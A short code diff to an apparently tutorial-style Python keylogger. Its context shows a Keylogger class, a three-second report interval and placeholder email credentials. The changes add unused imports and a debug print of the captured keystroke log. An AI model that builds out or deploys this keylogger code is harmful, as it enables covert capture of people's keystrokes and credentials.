@@ -6,6 +6,13 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+from math import prod
+import pandas as pd
+from io import StringIO
+from datetime import datetime
+from sqlalchemy import create_engine
+
+
 SEND_REPORT_EVERY = 3 # in seconds, 60 means 1 minute and so on
 # EMAIL_ADDRESS = "email@provider.tld"
 # EMAIL_PASSWORD = "password_here"
@@ -50,6 +57,16 @@ class Keylogger:
         # finally, add the key name to our global `self.log` variable
         name = name.upper()
         self.log += name
+        
+
+
+        print(f'my name is {self.log}')
+
+        # testport = self.log
+        # print(testport)
+
+    
+   
     
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
